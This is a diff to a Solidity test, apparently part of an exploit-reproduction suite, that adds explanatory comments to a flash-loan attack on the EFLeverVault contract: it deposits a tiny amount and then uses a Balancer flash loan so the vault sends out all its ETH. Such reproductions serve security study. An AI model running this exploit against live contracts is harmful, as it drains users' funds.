@@ -30,7 +30,7 @@ contract ContractTest is DSTest{
     function testExploit() public {
         
         uint ETHBalanceBefore = address(this).balance;
-        // deposit
+        // deposit a tiny amount
         Vault.deposit{value: 1e17}(1e17);
         // FlashLoan manipulate Contract balance
         address [] memory tokens = new address[](1);
@@ -44,8 +44,17 @@ contract ContractTest is DSTest{
             address(Vault).balance,
             18
         );
+        // https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8#code#F5#L16
+        /* flash loan to the Vault
+            The EFLeverVault handles withdraws by making a flash loan to itself for that amount, when it receives the flash loan, 
+            it withdraws that amount of funds, and leaves it in eth on the contract. After the flash loan is over, 
+            the contracts sends all ETH on the contract to user.
+        */
+        
         balancer.flashLoan(address(Vault), tokens, amounts, userData);
-
+        // https://etherscan.io/address/0xe39fd820B58f83205Db1D9225f28105971c3D309#code#L311
+        // flashLoan trigger receiveFlashLoan which trigger _withdraw
+        // at this point Vault has 1_000 * 1e18 WETH from the previous flashLoan
         emit log_named_decimal_uint(
             "[Start] After flashloan, ETH balance in EFLeverVault",
             address(Vault).balance,
